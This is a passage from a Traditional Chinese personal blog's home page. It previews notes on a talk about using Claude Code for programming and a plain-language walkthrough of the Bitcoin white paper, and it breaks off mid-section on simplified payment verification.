
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="utf-8" />
    <title>t2o0n321.blog</title>
    <meta name="author" content="t2o0n321" />
    <meta name="description" content="t2o0n321 的部落格，記錄生活點滴、學習筆記、程式開發等。" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/avatar.gif" />
    <link rel="preconnect" href="https://cdnjs.cloudflare.com" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/3.5.13/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlightjs-line-numbers.js/2.6.0/highlightjs-line-numbers.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/default.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/bash.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>載入過慢請開啟暫存 瀏覽器默認開啟</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>T2O0N321.BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;T2O0N321.BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div
        id="home-background"
        ref="homeBackground"
        data-images="/images/gura1.jpg"
    ></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>t2o0n321.blog</h1>
                <h3>t2o0n321 ㄟ 個人部落格</h3>
                <h5>t2o0n321 的部落格，記錄生活點滴、學習筆記、程式開發等。</h5>
            </div>
        </span>
    </div>
</div>
<div
    id="home-posts-wrap"
    ref="homePostsWrap"
    true
>
    <div id="home-posts">
        

<div class="post">
    <a href="/2025/07/13/From-Black-Box-Terminal-to-the-New-Era-of-Programming/">
        <h2 class="post-title">從黑框終端到程式撰寫新世代：Claude Code筆記分享</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/7/13
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="目錄">目錄</h1>
<ul>
<li><a href="#零前言">零、前言</a></li>
<li><a
href="#一程式撰寫工具的演進從手動到ai助手">一、程式撰寫工具的演進：從手動到AI助手</a></li>
<li><a href="#二實用技巧謀定動三訣">二、實用技巧：謀定動三訣</a>
<ul>
<li><a href="#1-謀把需求講清楚">1. 謀：把需求講清楚</a></li>
<li><a href="#2-定拆解任務">2. 定：拆解任務</a></li>
<li><a href="#3-動快速執行">3. 動：快速執行</a></li>
</ul></li>
<li><a href="#三提示詞技巧簡單最好">三、提示詞技巧：簡單最好</a>
<ul>
<li><a href="#1-啟動深度思考">1. 啟動深度思考</a></li>
<li><a href="#2-用正面表達">2. 用正面表達</a></li>
<li><a href="#3-講清楚標準">3. 講清楚標準</a></li>
<li><a href="#4-處理長文字">4. 處理長文字</a></li>
</ul></li>
<li><a
href="#四ai的極限人工具模型">四、AI的極限：人、工具、模型</a></li>
<li><a
href="#五我的感觸迎接數位時代">五、我的感觸：迎接數位時代</a></li>
<li><a href="#六參考">六、參考</a></li>
</ul>
<h1 id="零前言">零、前言</h1>
<p>最近看了一段關於Claude
Code的分享影片，講者海大介紹了這款AI程式撰寫工具的使用心得。作為對AI工具感興趣的讀者，我被他提到的「黑框終端」吸引——都2025年了，號稱最強的程式撰寫工具居然用命令列介面？這也太復古了吧！雖然我平時用的是Gemini
CLI，但海大的分享讓我對Claude
Code產生好奇，於是整理這篇筆記，分享他的觀點和我的理解，給有興趣的台灣開發者參考。</p>
<p>這篇筆記分五部分：<br />
1. <strong>程式撰寫工具的演進</strong>：從手動寫代碼到AI助手，Claude
Code為何選終端？<br />
2.
<strong>實用技巧</strong>：海大的「謀定動」三訣，效率翻倍的秘訣。<br />
3. <strong>提示詞技巧</strong>：說清楚需求，讓AI更好用。<br />
4.
<strong>AI的極限</strong>：人、工具、模型如何決定程式撰寫的邊界？<br />
5. <strong>我的感觸</strong>：程式設計師的「數位時代」來了！</p>
<h1
id="一程式撰寫工具的演進從手動到ai助手">一、程式撰寫工具的演進：從手動到AI助手</h1>
<p>海大提到，程式撰寫工具的進化就像科技史的縮影。2000年代，程式設計師全靠手動寫代碼，頂多用簡單的自動補全，比如輸入「.」會跳出屬性選項。2018年，TabNine用GPT-2做到整行代碼補全，當時已經很厲害。2022年ChatGPT、2023年GPT-4的出現更是讓人驚嘆，AI寫代碼的能力甚至超越許多專業人士。2024年，AI內建於編輯器，2025年的Claude
Code、Cursor等工具不僅補全代碼，還能理解專案、拆解任務，宛如真正的程式撰寫助手。</p>
<p>Claude
Code最令人意外的是它選擇命令列介面，而非花俏的圖形介面。為什麼？海大解釋有兩個原因：<br />
- <strong>編輯器種類繁多</strong>：程式設計師用的工具各異（VS
Code、Emacs等），命令列是通用的，誰都能用。<br />
-
<strong>圖形介面有侷限</strong>：程式撰寫的核心是感知、規劃、執行，與介面好不好看無關。複雜的UI可能反而限制AI。</p>
<p>命令列的三大優勢是：<br />
-
<strong>自由度高</strong>：能直接使用系統所有功能，不受UI框架限制。<br />
- <strong>操作簡單</strong>：只要說出需求，不用學繁瑣介面。<br />
- <strong>工具相容</strong>：npm、Docker等命令列工具與終端無縫整合。</p>
<p>海大說，Claude
Code雖然看起來陽春，但代碼理解能力超強，效率驚人。它的API額度也很慷慨，一天能用掉價值200美元的token，對資源需求大的開發者來說超划算。</p>
<h1 id="二實用技巧謀定動三訣">二、實用技巧：謀定動三訣</h1>
<p>海大的「謀定動」三訣把AI程式撰寫比喻成開車：先確定目的地（謀），規劃路線（定），然後加速前進（動）。這些技巧簡單卻實用，值得一試。</p>
<h2 id="謀把需求講清楚">1. 謀：把需求講清楚</h2>
<p>需求不清，AI再強也會出錯。海大的方法是：<br />
-
<strong>多討論</strong>：跟AI反覆溝通，確保自己的思路清晰，AI也能找出邏輯漏洞。<br />
-
<strong>請AI重述</strong>：讓AI把需求複述一遍，確認雙方理解一致，出錯時好追蹤原因。</p>
<p>例如，做一個待辦清單（Todo
List），需求是「支援新增、刪除、標記完成」，跟AI討論後可能會發現忘了提到資料儲存方式。海大說，講清楚需求能減少80%的重工，這點對新手尤其重要。</p>
<h2 id="定拆解任務">2. 定：拆解任務</h2>
<p>需求確認後，讓AI制定執行計劃。比如說：「根據需求，列出任務計劃，標出哪些可以同時進行。」AI會給出清單，像先定資料結構、再寫前端介面。有了計劃，後續執行就順暢許多。</p>
<h2 id="動快速執行">3. 動：快速執行</h2>
<p>計劃好後，讓AI全速生成代碼。如果出錯：<br />
- <strong>喊停重來</strong>：按Ctrl+C終止，重新輸入需求。<br />
- <strong>小修小補</strong>：小問題就補充指令，AI會自行調整。<br />
-
<strong>清記憶</strong>：AI偶爾會「卡住」，用類似<code>clear</code>的指令重置。</p>
<p>其他實用建議：<br />
- 用<code>git</code>生成專案上下文檔案，幫助AI記錄背景。<br />
- 為AI寫專用註解，讓它更懂你的意圖。<br />
-
常用命令（如啟動前端、檢查錯誤訊息）可存起來重複用，或自訂指令省時間。<br />
- 新手建議用現成框架（像React腳手架），少走冤枉路。</p>
<h1 id="三提示詞技巧簡單最好">三、提示詞技巧：簡單最好</h1>
<p>海大強調，提示詞不用搞得太複雜，關鍵是<strong>講清楚</strong>。Claude
Code很聰明，簡單的表達效果最好，繁瑣的指令反而可能誤導。</p>
<h2 id="啟動深度思考">1. 啟動深度思考</h2>
<p>對AI說「認真思考再回答」，能啟動類似Claude
Code的<code>thinker</code>功能，讓答案更精準。例如：「分析待辦清單的代碼，找出效能瓶頸並優化。」AI會分步拆解問題，結果更可靠。如果回應太慢，搭配「分步思考」（列出步驟），能減少超時問題。</p>
<h2 id="用正面表達">2. 用正面表達</h2>
<p>說「要做什麼」比「不要做什麼」有效。例如：<br />
- 不要這樣：不要用弱型別、不要寫重複代碼。<br />
- 要這樣：用TypeScript明確型別、把共用邏輯寫成函式。</p>
<p>正面表達能讓AI清楚方向，減少混淆。</p>
<h2 id="講清楚標準">3. 講清楚標準</h2>
<p>提前說明要求，比如：「我要一個待辦清單，支援所有合法輸入，代碼要簡潔、可維護。如果需求不合理，直接說。」這能避免AI寫出敷衍的代碼。</p>
<h2 id="處理長文字">4. 處理長文字</h2>
<p>分析錯誤訊息時，先貼訊息，再寫指令。例如：「根據以上錯誤訊息，找出程式當掉的原因並給解法。」指令放後面，AI理解更準。</p>
<h1 id="四ai的極限人工具模型">四、AI的極限：人、工具、模型</h1>
<p>海大用「人-工具-模型」框架分析AI程式撰寫的極限，很有啟發：<br />
1. <strong>模型</strong>：決定AI的能力上限。像Claude
Code或Gemini這樣的頂尖模型若無法實現某代碼，當前技術就無解。<br />
2. <strong>工具</strong>：Claude
Code這類工具是模型的外殼，負責優化互動和專案管理。它的命令列設計簡單但高效。<br />
3. <strong>人</strong>：程式設計師有三個角色：<br/> -
定義者：清楚表達需求。<br />
- 審查者：檢查代碼品質和邏輯。<br />
- 創作者：架構設計和創新算法仍需人類智慧。</p>
<p>AI擅長寫基本功能、改進代碼、生成測試和文件，但突破性創新還得靠人。這個框架讓我更明白如何善用AI工具。</p>
<h1 id="五我的感觸迎接數位時代">五、我的感觸：迎接數位時代</h1>
<p>海大提到Claude
Code宕機時，他手寫代碼花了20多分鐘才完成10分鐘的功能，還想讓AI檢查。這讓我想到自己寫代碼時，總會不自覺想問AI「這段OK嗎」。AI已經悄悄改變了我們的習慣。</p>
<p>他把這比喻成從「底片時代」到「數位時代」。底片時代，攝影師每按快門都小心翼翼，底片珍貴，構圖全靠經驗。數位時代，記憶卡讓你隨意拍，重點是挑選好照片和後製。程式撰寫也一樣：以前每行代碼都要深思熟慮，現在AI生成多個版本，我們挑最好的、快速調整，核心能力變成寫好提示詞和辨別好代碼。</p>
<p>基礎原理還是很重要，但AI讓我能專注在更高層的邏輯和創意。這種改變有點不適應，卻也充滿機會——程式撰寫變得更輕鬆，讓我們能把心力放在更有趣的事情上。Claude
Code的終端設計雖然復古，但效率驚人，改天真想試試看！</p>
<h1 id="六參考">六、參考</h1>
<ul>
<li><a
target="_blank" rel="noopener" href="https://youtu.be/sOvi9Iu1Dq8?si=R6PpKZIZ0QGZ9j_4">海大的影片</a></li>
</ul>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/vibe-coding/" style="color: #03a9f4">vibe-coding</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/AI/" style="color: #ff7d73">AI</a>
        </span>
        
    </div>
    <a href="/2025/07/13/From-Black-Box-Terminal-to-the-New-Era-of-Programming/" class="go-post">閱讀全文</a>
</div>

<div class="post">
    <a href="/2025/06/25/bitcoin-whitepaper/">
        <h2 class="post-title">Bitcoin White Paper</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/6/25
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="bitcoin-white-paper">Bitcoin White Paper</h1>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://github.com/cypherpunks-core/bitcoin_whitepaper_zh">https://github.com/cypherpunks-core/bitcoin_whitepaper_zh</a>
<br/> <a
target="_blank" rel="noopener" href="https://peterpowerfullife.com/blog/satoshi-nakamoto-electronic-cash-white-paper/">https://peterpowerfullife.com/blog/satoshi-nakamoto-electronic-cash-white-paper/</a></p>
</blockquote>
<p>這邊會從我的學習筆記簡單介紹比特幣的白皮書，如果需要更細節的內容，可以看我在
notion 發布的筆記文章喔：</p>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://t2o0n321-note.notion.site/Bitcoin-White-Paper-2035a22fbd8d80f3aa78d55e6909224d?pvs=73">https://t2o0n321-note.notion.site/Bitcoin-White-Paper-2035a22fbd8d80f3aa78d55e6909224d?pvs=73</a></p>
</blockquote>
<h1 id="目錄">目錄</h1>
<ol type="1">
<li><a href="#一簡介">簡介</a></li>
<li><a href="#二交易transaction-tx">交易（Transaction, TX）</a></li>
<li><a href="#三時間戳伺服器timestamp-server">時間戳伺服器（Timestamp
Server）</a></li>
<li><a href="#四工作量證明proof-of-work-pow">工作量證明（Proof of Work,
PoW）</a></li>
<li><a href="#五網路-network">網路 (Network)</a></li>
<li><a href="#六獎勵-incentive">獎勵 (Incentive)</a></li>
<li><a
href="#七回收硬碟空間reclaiming-disk-space">回收硬碟空間（Reclaiming
Disk Space）</a></li>
<li><a
href="#八簡化版支付確認-simplified-payment-verification-spv">簡化版支付確認
(Simplified Payment Verification, SPV)</a></li>
<li><a
href="#九價值的組合與分割-combining-and-splitting-value">價值的組合與分割
(Combining and Splitting Value)</a></li>
<li><a href="#十隱私-privacy">隱私 (Privacy)</a></li>
<li><a href="#十一計算-calculations">計算 (Calculations)</a></li>
</ol>
<hr />
<h1 id="一簡介">一、簡介</h1>
<p>你有沒有發現，現在網路上的金錢交易，幾乎都要靠銀行或第三方支付公司來幫忙？這些金融機構就像是大家都要信任的「中間人」，幫我們處理每一筆轉帳或付款。</p>
<p>但這樣的做法，其實有不少小麻煩：</p>
<ol type="1">
<li><strong>一定要信任中間人</strong>：
<ul>
<li>不管你是買東西還是收錢，都得相信銀行或支付公司會幫你把錢處理好。</li>
</ul></li>
<li><strong>交易可能被取消</strong>：
<ul>
<li>有時候，明明已經付錢了，卻還是有可能被退回或撤銷，像是信用卡爭議、詐騙等。</li>
<li>這讓賣家很不安心，怕收到錢後又被追回。</li>
</ul></li>
<li><strong>手續費和麻煩多</strong>：
<ul>
<li>因為要防止糾紛，銀行常常會要求你提供很多資料，流程也變得複雜，還要收手續費。</li>
</ul></li>
<li><strong>線上交易不夠「像現金」</strong>：
<ul>
<li>在現實生活中，現金交易是「一手交錢一手交貨」，沒有人能反悔。但網路上，這種「不可逆」的感覺很難做到。</li>
</ul></li>
</ol>
<p>所以，大家一直在想，有沒有可能發明一種「不用信任中間人」的網路金錢？</p>
<p>理想的電子支付系統，應該要：</p>
<ul>
<li>讓雙方直接交易，不用靠銀行背書。</li>
<li>交易一旦完成就不能反悔，保護賣家。</li>
<li>能防止「一筆錢花兩次」這種作弊（雙重支付）。</li>
<li>整個系統要夠安全，只要大多數人是誠實的，壞人就很難搞破壞。</li>
</ul>
<hr />
<h1 id="二交易transaction-tx">二、交易（Transaction, TX）</h1>
<h2 id="虛擬貨幣的基本玩法">虛擬貨幣的基本玩法</h2>
<ol type="1">
<li><strong>什麼是電子貨幣？</strong>
<ul>
<li>你可以把電子貨幣想像成一條「簽名接力棒」。每次有人把錢轉給別人，就在這條接力棒上加一個自己的簽名。</li>
<li>這樣，每一筆錢的來龍去脈都查得到，誰給誰、什麼時候，都有記錄。</li>
</ul></li>
<li><strong>怎麼轉帳？</strong>
<ul>
<li>假設你要把手上的比特幣轉給朋友，你會：
<ul>
<li>把上一次收到這筆錢的紀錄（hash）和朋友的「收款帳號」（公鑰）寫在一起。</li>
<li>用自己的「私鑰」簽名，證明這筆錢真的屬於你。</li>
</ul></li>
<li>這樣一來，朋友收到後，也能查到這筆錢的歷史，確定沒問題。</li>
</ul></li>
</ol>
<img src="/2025/06/25/bitcoin-whitepaper/image.png" class="">
<ol start="3" type="1">
<li><strong>怎麼驗證？</strong>
<ul>
<li>收到錢的人，只要檢查這條「簽名接力棒」上的每一個簽名，就能確定這筆錢沒被亂改，也真的屬於轉帳的人。</li>
</ul></li>
</ol>
<h2 id="雙重支付的問題">雙重支付的問題</h2>
<ol type="1">
<li><strong>什麼是雙重支付？</strong>
<ul>
<li>因為電子資料很容易複製，有些人可能會想「一筆錢花兩次」。</li>
<li>這就像你把同一張百元鈔票影印兩份，分別給兩個人，這在現實世界當然不行，但在網路上卻很難防。</li>
</ul></li>
<li><strong>傳統解法：找個公正的「鑄幣廠」</strong>
<ul>
<li>以前的做法，是找一個大家都信任的「鑄幣廠」（有點像銀行），每一筆交易都要經過它來檢查。</li>
<li>只要鑄幣廠說OK，這筆錢才算真的轉手。</li>
<li>但這樣一來，整個系統就又回到「要信任中間人」的老問題。</li>
</ul></li>
</ol>
<h2 id="去中心化的想法">去中心化的想法</h2>
<ol type="1">
<li><strong>大家一起監督</strong>
<ul>
<li>如果我們不想靠單一的鑄幣廠，那就要讓所有人都能看到每一筆交易的歷史。</li>
<li>這樣，大家可以一起確認，這筆錢是不是第一次被花出去。</li>
</ul></li>
<li><strong>共識很重要</strong>
<ul>
<li>要做到這一點，系統必須有辦法讓大家對「哪一筆交易是最早的」達成共識，這樣才能防止有人作弊。</li>
</ul></li>
</ol>
<hr />
<h1 id="三時間戳伺服器timestamp-server">三、時間戳伺服器（Timestamp
Server）</h1>
<p>你可以把「時間戳伺服器」想像成一個公開的日記本，大家都能在上面寫下「我在某個時間點做了什麼事」。</p>
<ol type="1">
<li><strong>時間戳伺服器是什麼？</strong>
<ul>
<li>它會把一堆交易（像一頁日記）做成一個「雜湊」（hash），然後標記上時間，公開給大家看。</li>
<li>這就像你把一張照片貼到網路論壇，證明「這張照片在某個時間點就已經存在了」。</li>
</ul></li>
<li><strong>為什麼要這樣做？</strong>
<ul>
<li>這樣可以證明，這些交易在那個時間點之前就已經發生，沒有人能事後偷偷改掉。</li>
</ul></li>
<li><strong>怎麼串成一條鏈？</strong>
<ul>
<li>每一個新的時間戳，裡面都會包含前一個時間戳的雜湊，這樣就像一條「日記鏈」一樣，一環扣一環。</li>
<li>如果有人想改過去的紀錄，就必須把後面所有的日記都重寫，這幾乎是不可能的。</li>
</ul></li>
</ol>
<hr />
<h1 id="四工作量證明proof-of-work-pow">四、工作量證明（Proof of Work,
PoW）</h1>
<ol type="1">
<li><strong>什麼是工作量證明？</strong>
<ul>
<li>你可以把它想像成一個「解謎比賽」。</li>
<li>每個人都在搶著解出一個很難的謎題（就是找到一個特定的數字，讓整個區塊的雜湊值有很多個0開頭）。</li>
<li>誰先解出來，誰就有權利把這一頁日記（區塊）寫進區塊鏈。</li>
</ul></li>
<li><strong>為什麼要這麼麻煩？</strong>
<ul>
<li>這樣做的好處是，大家都要花力氣（算力）來參與，沒有人能輕易作弊。</li>
<li>只要大多數人是誠實的，壞人就算想作弊，也要付出比別人更多的努力，幾乎不可能成功。</li>
</ul></li>
<li><strong>怎麼驗證？</strong>
<ul>
<li>驗證很簡單，只要檢查這個答案（雜湊值）是不是有夠多的0開頭就好。</li>
<li>所以「解題」很難，「驗證」卻很快。</li>
</ul></li>
<li><strong>比喻一下</strong>：
<ul>
<li>想像你和朋友玩猜數字遊戲，規則是「誰先猜到一個讓答案開頭有5個0的數字就贏」。</li>
<li>你可能要猜很多次才會中，但只要中一次，大家一看就知道你對了。</li>
</ul></li>
<li><strong>保護區塊鏈的秘密武器</strong>：
<ul>
<li>工作量證明讓每一個區塊都很難被改動。</li>
<li>如果有人想改過去的區塊，不只要重做那個區塊的謎題，還要把後面所有的謎題都重新解過，這幾乎是不可能的。</li>
</ul></li>
<li><strong>難度會調整</strong>：
<ul>
<li>如果大家解謎太快，系統就會自動把謎題變難，讓平均每10分鐘才會有一個人解出來。</li>
<li>這樣可以確保區塊鏈的成長速度穩定，不會一下子暴衝。</li>
</ul></li>
</ol>
<hr />
<h1 id="五網路-network">五、網路 (Network)</h1>
<p>你可以把比特幣的網路想像成一個大家都能參加的「大群組」，每個人都可以看到最新的交易消息，也都能參與維護這個系統。</p>
<p>比特幣網路的運作流程，其實就像一場大家一起參加的「記帳遊戲」：</p>
<ol type="1">
<li><strong>新交易廣播給所有人</strong>
<ul>
<li>每當有人發送比特幣（像是A轉1顆比特幣給B），這筆交易就會被「大聲宣布」給所有節點知道。</li>
<li>每個節點都會把這筆交易暫時放進自己的「記憶池」（mempool），等著打包。</li>
</ul></li>
<li><strong>大家收集交易、組成區塊</strong>
<ul>
<li>節點（尤其是礦工）會從記憶池裡挑選還沒被打包的交易，組成一個「候選區塊」。</li>
<li>這就像大家把還沒送出去的包裹裝進一個大箱子，準備進行下一步——挖礦。</li>
</ul></li>
<li><strong>開始解謎（挖礦）</strong>
<ul>
<li>每個礦工都會為這個候選區塊進行「工作量證明」（Proof of
Work），也就是拼命猜數字，直到找到一個讓區塊雜湊值夠難的答案。</li>
</ul></li>
<li><strong>有人解出謎題就廣播新區塊</strong>
<ul>
<li>一旦有礦工成功解出謎題，就會馬上把這個新區塊「大聲宣布」給全網。</li>
<li>區塊裡包含一堆交易、前一個區塊的雜湊、時間戳記、nonce等。</li>
</ul></li>
<li><strong>大家檢查新區塊是否合格</strong>
<ul>
<li>其他節點收到新區塊後，會檢查裡面的每一筆交易是不是有效，有沒有雙重支付，區塊本身的結構和工作量證明對不對。</li>
<li>只有全部通過檢查，這個區塊才會被大家接受。</li>
</ul></li>
<li><strong>大家以這個區塊為基礎繼續挖礦</strong>
<ul>
<li>如果節點認可這個區塊，就會以它為基礎繼續挖下一個區塊。</li>
<li>這個行為也像是在「投票」：代表「我認同這個區塊，因為我以它為基礎繼續努力」。</li>
</ul></li>
</ol>
<aside>
<h3 id="總結流程串起來就是">總結流程串起來就是：</h3>
<ol type="1">
<li>新交易發送出來，全網知道。</li>
<li>礦工收集交易、組區塊。</li>
<li>礦工開始 PoW 挖礦。</li>
<li>有人挖到就廣播。</li>
<li>其他節點驗證後接受。</li>
<li>所有人就從這個區塊繼續往下挖。</li>
</ol>
</aside>
<hr />
<h1 id="六獎勵-incentive">六、獎勵 (Incentive)</h1>
<p>你可能會好奇：「這麼多人願意花電力、時間來幫忙維護比特幣網路，他們到底圖什麼？」</p>
<p>其實，比特幣設計了一套很聰明的獎勵機制，讓大家有動力參與：</p>
<ol type="1">
<li><strong>挖礦獎勵：新比特幣的誕生</strong>
<ul>
<li>每個區塊的第一筆交易叫做「創幣交易」（coinbase
transaction），這筆交易會「從無到有」產生新的比特幣，直接給挖到這個區塊的礦工。</li>
<li>這就像黃金系統：誰挖到就是誰的，但你得付出努力（電力、時間）才挖得到。</li>
</ul></li>
<li><strong>交易手續費也是獎勵</strong>
<ul>
<li>除了新幣，每筆交易如果有多餘的錢沒轉出去（輸入大於輸出），這些差額就會變成手續費，歸打包區塊的礦工所有。</li>
<li>這讓礦工即使未來新幣越來越少，還是有收入來源。</li>
</ul></li>
<li><strong>新幣會越來越少，最終只靠手續費</strong>
<ul>
<li>比特幣總量有限（2100萬顆），每隔約四年，挖礦獎勵就會「減半」。</li>
<li>最後新幣發完，礦工就只能靠手續費維生。</li>
</ul></li>
<li><strong>誠實比作弊更有利</strong>
<ul>
<li>比特幣的獎勵設計，讓誠實參與比作弊更划算。</li>
<li>如果你有很多算力，與其花力氣作弊，不如老老實實挖礦，這樣每10分鐘就能穩定拿到獎勵和手續費，長期下來更賺。</li>
</ul></li>
</ol>
<aside>
<blockquote>
<p>💡 獎勵機制 = 幣的分發 + 鼓勵誠實 + 阻止攻擊</p>
</blockquote>
比特幣不是靠法律強制大家守規矩，而是用經濟誘因讓誠實行為自然而然發生，這就是它去中心化的根本。
</aside>
<hr />
<h1
id="七回收硬碟空間reclaiming-disk-space">七、回收硬碟空間（Reclaiming
Disk Space）</h1>
<p>你可能會想：「比特幣區塊鏈這麼大，會不會有一天硬碟裝不下？」</p>
<p>其實，比特幣有一個很聰明的設計，讓你不用一直存下所有的細節資料：</p>
<ol type="1">
<li><strong>哪些資料可以刪？</strong>
<ul>
<li>如果一枚比特幣的最新交易已經被很多區塊覆蓋（也就是說，這筆錢已經被花出去很久了），那麼它之前的交易歷史就可以放心刪掉。</li>
<li>這就像你把舊收據丟掉，只保留最新的帳本紀錄。</li>
</ul></li>
<li><strong>怎麼刪又不會壞掉？</strong>
<ul>
<li>這裡用到一個叫「Merkle Tree（梅克爾樹）」的技術。</li>
<li>所有交易會被組成一棵樹，最上面的「樹根」（Merkle
Root）會放進區塊頭裡。</li>
<li>只要樹根沒變，就算你把底下的某些枝葉（舊交易細節）砍掉，整個區塊的驗證還是成立。</li>
</ul></li>
<li><strong>只存區塊頭就夠了嗎？</strong>
<ul>
<li>其實只要存下每個區塊的「區塊頭」（Header），就能追蹤整條鏈的歷史。</li>
<li>一個區塊頭大約80
bytes，一年下來也才幾MB，對現代電腦來說根本不痛不癢。</li>
<li>這種「輕節點」（SPV節點）就算硬碟小，也能參與比特幣網路。</li>
</ul></li>
<li><strong>摩爾定律的幫忙</strong>
<ul>
<li>電腦硬體越來越進步，區塊鏈資料的成長速度其實遠比硬碟容量慢，所以不用太擔心。</li>
</ul></li>
</ol>
<hr />
<h1
id="八簡化版支付確認-simplified-payment-verification-spv">八、簡化版支付確認
(Simplified Payment Verification, SPV)</h1>
<p>有些人會問：「我不想下載整條區塊鏈，只想知道自己收到的比特幣有沒有被確認，行不行？」</p>
<p>答案是：可以！這就是「簡化版支付確認」（SPV）的用意。</p>
<ol type="1">
<li><strong>SPV怎麼運作？</strong>
<ul>
<li>你只需要三樣東西：
<ul>
<li>最長的區塊鏈「區塊頭」列表（很小很輕）。</li>
<li>你那筆交易的「Merkle分支」（證明這筆交易真的在某個區塊裡）。</li>
<li>這筆交易被打包進哪個區塊的時間戳。</li>
</ul></li>
<li>這樣你就能確認：
<ul>
<li>有完整節點曾經打包這筆交易。</li>
<li>這個區塊是目前最長鏈的一部分。</li>
<li>隨著後面區塊越來越多，你的交易就越安全。</li>
</ul></li>
</ul></li>
<li><strong>SPV的好處</strong>
<ul>
<li>不用下載整條區塊鏈，手機、平板也能輕鬆驗證收款。</li>
<li>很多行動錢包、輕錢包（像Electrum、Trust
Wallet）都是用這種方式。</li>
</ul></li>
<li><strong>SPV的風險</strong>
<ul>
<li>SPV的安全性還是要靠大多數節點是誠實的。</li>
